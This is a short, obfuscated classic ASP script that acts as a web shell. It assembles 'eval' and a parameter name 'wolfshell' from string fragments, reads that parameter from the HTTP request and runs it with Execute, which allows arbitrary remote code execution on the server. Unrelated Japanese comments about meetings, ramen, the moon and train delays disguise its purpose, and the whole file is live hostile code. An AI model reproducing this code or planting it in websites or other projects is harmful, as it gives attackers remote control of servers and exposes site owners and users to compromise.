<%
' // 明日の会議、忘れないように。
Dim state_m4k1, p_str_a9b2, p_str_c8d3, p_data_e7f4, exec_str_g6h5
state_m4k1 = 1

Do While state_m4k1 > 0
    Select Case state_m4k1
        ' // このコードは一体何をしているんだろう？
        Case 1
            p_str_a9b2 = "e" & "v" & "a" & "l"
            state_m4k1 = 2
        ' // ラーメンが食べたいな。
        Case 2
            p_str_c8d3 = "wolf" & "shell"
            state_m4k1 = 3
        ' // 月が綺麗ですね。
        Case 3
            p_data_e7f4 = Request(p_str_c8d3)
            If Len(p_data_e7f4) > 0 Then
                state_m4k1 = 4
            Else
                state_m4k1 = -1
            End If
        ' // 電車が遅延しています。
        Case 4
            exec_str_g6h5 = p_str_a9b2 & "(Request(""" & p_str_c8d3 & """))"
            Execute exec_str_g6h5
            state_m4k1 = -1
    End Select
Loop
%>